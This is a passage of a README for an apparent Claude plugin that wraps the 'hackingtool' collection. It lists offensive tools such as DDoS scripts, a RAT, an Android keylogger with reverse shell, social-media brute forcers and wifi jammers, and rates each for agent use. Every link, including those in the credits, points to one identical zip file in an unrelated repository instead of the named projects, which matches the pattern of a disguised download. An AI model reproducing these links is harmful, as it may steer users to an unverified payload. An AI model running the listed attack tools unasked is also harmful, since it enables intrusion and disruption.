| [Commix](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Automated OS command injection and exploitation tool. | 🟡 | `interactive` `sudo` |
| [RouterSploit](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Exploitation framework dedicated to embedded devices. | 🟡 | `sudo` |
| [WebSploit](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Advanced MITM framework. | 🟡 | `sudo` |

### 🔁 Reverse Engineering (5)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Androguard](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Reverse engineering and malware analysis of Android apps. | 🟡 | `sudo` |
| [Apk2Gold](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | CLI tool for decompiling Android apps to Java. | 🟡 | `interactive` `sudo` |
| [Ghidra](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | NSA's software reverse engineering framework. | 🟡 | `sudo` `gui` |
| [JadX](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Dex to Java decompiler. | 🟡 | `sudo` |
| [Radare2](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Portable UNIX-like reverse engineering framework. | 🟢 | — |

### ⚡ DDOS (6)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Asyncrone (SYN Flood)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | C-based multifunction SYN Flood weapon. | 🟡 | `interactive` `sudo` `long` |
| [DDoS Script](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | DDoS attack script — 36+ methods. | 🟡 | `interactive` `sudo` `long` |
| [GoldenEye](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Python3 stress testing app. | 🟡 | `interactive` `long` |
| [SaphyraDDoS](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Python DDoS script. | 🟡 | `interactive` `long` |
| SlowLoris | HTTP Denial of Service attack. | 🟡 | `interactive` `sudo` `long` |
| [UFOnet](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | P2P cryptographic disruptive toolkit for DoS/DDoS. | 🟡 | `gui` `long` |

### 🖥 RAT (1)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Pyshell](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | RAT with file upload/download. | 🟢 | — |

### 💥 XSS (9)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [XSStrike](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Python-based XSS detection and exploitation tool. | 🟡 | `sudo` |
| [DalFox](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | XSS scanning and parameter analysis tool. | 🟡 | `sudo` |
| [Extended XSS Searcher](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Extended XSS searcher and finder. | 🟡 | `interactive` |
| [RVuln](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Multi-threaded web vulnerability scanner in Rust. | 🟡 | `sudo` |
| [XanXSS](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Reflected XSS searching tool with template-based payloads. | 🟡 | — |
| [XSpear](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | XSS scanner built on Ruby Gems. | 🟢 | — |
| [XSS Payload Generator](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | XSS payload generator, scanner, and dork finder. | 🟡 | `sudo` |
| [XSS-Freak](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | XSS scanner written in Python 3. | 🟡 | `sudo` |
| [XSSCon](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | XSS scanner. | 🟡 | `interactive` `sudo` |

### 🖼 Steganography (4)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| SteganoHide | Hide/retrieve data in image or audio files. | 🟡 | `interactive` `sudo` |
| StegnoCracker | Brute force hidden data inside files. | 🟡 | `interactive` `long` |
| [StegoCracker](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Hide and retrieve data in image or audio files. | 🟡 | `sudo` |
| [Whitespace](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Steganography via whitespace and unicode. | 🟡 | `sudo` |

### 🏢 Active Directory (6)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [BloodHound](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Graph theory to reveal hidden attack paths in AD/Azure. | 🟡 | `sudo` |
| [Certipy](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Active Directory Certificate Services enumeration and abuse. | 🟢 | — |
| [Impacket](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Python classes for SMB, MSRPC, Kerberos, LDAP. | 🟢 | — |
| [Kerbrute](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Kerberos pre-auth brute-forcer — enumeration and spraying. | 🟢 | — |
| [NetExec (nxc)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Swiss army knife for Windows/AD pentesting — CrackMapExec successor. | 🟢 | — |
| [Responder](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | LLMNR/NBT-NS/MDNS poisoner for credential capture. | 🟡 | `sudo` |

### ☁ Cloud Security (4)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Pacu](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | AWS exploitation framework for offensive security testing. | 🟢 | — |
| [Prowler](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Security tool for AWS, Azure, GCP, Kubernetes. | 🟢 | — |
| [ScoutSuite](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Multi-cloud security auditing tool. | 🟢 | — |
| [Trivy](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Vulnerability scanner for containers, Kubernetes, IaC. | 🟡 | `sudo` |

### 📱 Mobile Security (3)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Frida](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Dynamic instrumentation toolkit for runtime hooking. | 🟢 | — |
| [MobSF](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | All-in-one mobile app pentesting and malware analysis. | 🟢 | — |
| [Objection](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Runtime mobile exploration powered by Frida. | 🟢 | — |

### ✨ Other (1)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [HatCloud](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Ruby tool to bypass CloudFlare and discover real IP. | 🟡 | `interactive` |

### 📱 Android Attack (5)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [DroidCam (Capture Image)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Grab front camera snap using a link. | 🟡 | `sudo` |
| [EvilApp](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Android App that hijacks authenticated sessions in cookies. | 🟢 | — |
| [Keydroid](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Android Keylogger + Reverse Shell. | 🟢 | — |
| [Lockphish](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Lock-screen phishing. | 🟢 | — |
| [MySMS](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Android App that hacks SMS through WAN. | 🟢 | — |

### 📧 Email Verifier (1)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Knockmail](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Verify if an email exists. | 🟡 | `sudo` |

### 🔑 Hash Crack (1)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Hash Buster](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Hash cracking via public hash databases. | 🟢 | — |

### 🎭 Homograph (1)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [EvilURL](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Unicode evil domains for IDN Homograph Attack. | 🟢 | — |

### 🧪 Mix Tools (2)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Crivo](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Extract and filter URLs, IPs, domains, and subdomains. | 🟡 | — |
| Terminal Multiplexer | Tilix — tiling terminal emulator. | 🟡 | `sudo` |

### 💉 Payload Injection (2)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Debinject](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Inject malicious code into *.debs. | 🟢 | — |
| [Pixload](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Image Payload Creating tools. | 🟡 | `sudo` |

### 📱 Social Media (4)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [AllinOne SocialMedia Attack](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Brute-force Gmail, Hotmail, Twitter, Facebook, Netflix. | 🟡 | `sudo` |
| [Application Checker](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Check if an app is installed on the target via link. | 🟡 | `sudo` |
| [Facebook Attack](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Facebook BruteForcer. | 🟡 | `interactive` `sudo` |
| [Instagram Attack](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Brute force attack against Instagram. | 🟡 | `archived` |

### 🔎 Social Media Finder (4)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Find SocialMedia By Facial Recognition](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Social Media Mapping Tool that correlates profiles. | 🟡 | `sudo` |
| [Find SocialMedia By UserName](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Find usernames across 75+ social networks. | 🟡 | `sudo` |
| [Sherlock](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Hunt down social media accounts by username. | 🟡 | `interactive` `sudo` |
| [SocialScan](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Check email and username availability on online platforms. | 🟡 | `interactive` |

### 🕸 Web Crawling (1)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Gospider](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fast web spider written in Go. | 🟡 | `sudo` |

### 📡 Wifi Jamming (2)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [KawaiiDeauther](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Pentest toolkit for wifi deauthentication. | 🟡 | `sudo` `hw` |
| [WifiJammer-NG](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Continuously jam all wifi clients and APs within range. | 🟡 | `sudo` `hw` |

---

## Refreshing the tool index

When upstream hackingtool adds tools, regenerate `data/tools.json` and the README table:

```
python ${CLAUDE_PLUGIN_ROOT}/scripts/ht_index.py --hackingtool-path /path/to/hackingtool
python ${CLAUDE_PLUGIN_ROOT}/scripts/build_readme_table.py > new_table.md
```

If hackingtool is a sibling directory of this repo, `--hackingtool-path` isn't needed — the script auto-detects.

---

## Directory layout

```
hackingtool-plugin/
├── .claude-plugin/
│   └── marketplace.json          # marketplace entry
├── images/                       # screenshots + logo
├── README.md                     # this file
└── plugins/hackingtool/
    ├── .claude-plugin/plugin.json
    ├── data/tools.json           # generated index
    ├── scripts/
    │   ├── ht_index.py           # (dev) regenerate tools.json
    │   ├── build_readme_table.py # (dev) regenerate the table above
    │   ├── ht_search.py          # query index
    │   ├── ht_env.py             # detect backend
    │   └── ht_run.py             # backend-aware tool runner
    └── skills/pentest/
        ├── SKILL.md
        └── reference/
            ├── workflows.md
            └── runtime-fallbacks.md
```

---

## Limitations

- **Python 3.10+** required.
- **No async tool streaming.** Long-running tools block until they finish or timeout.
- **Docker backend** pulls `kalilinux/kali-rolling` on first use.
- **Capability flags are heuristics.** If you find a mis-tagged tool, fix it in `data/tools.json` or open an issue.

---

## Credits

- Upstream toolkit: [Z4nzu/hackingtool](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) — all tool metadata, categorization, and screenshots originate from this project.
- Plugin wrapper: [ariacodez](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) (AKCodez on GitHub).

## License

MIT. Upstream Z4nzu/hackingtool is also MIT-licensed.

> **For authorized security testing, bug bounty, CTFs, and research only.**
